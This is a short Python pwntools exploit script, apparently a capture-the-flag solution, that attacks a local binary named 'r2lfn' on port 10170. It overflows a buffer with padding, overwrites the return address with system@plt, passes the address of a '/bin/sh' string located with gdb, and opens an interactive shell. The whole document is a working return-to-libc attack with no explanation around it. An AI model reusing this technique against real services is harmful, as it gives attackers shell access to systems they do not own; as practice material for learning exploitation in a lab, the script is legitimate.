#!/usr/bin/env python2.7
# coding: UTF-8

from pwn import *

r = remote('localhost', 10170)
elf = ELF('r2lfn')
system_plt = 0x8048410

'''
(gdb) find &main,+999,"/bin/sh"
0x80486ad
1 pattern found.
'''
binsh = 0x80486ad

r.send('A' * 16 + p32(elf.plt['system']) + 'BBBB' + p32(binsh))

r.interactive()
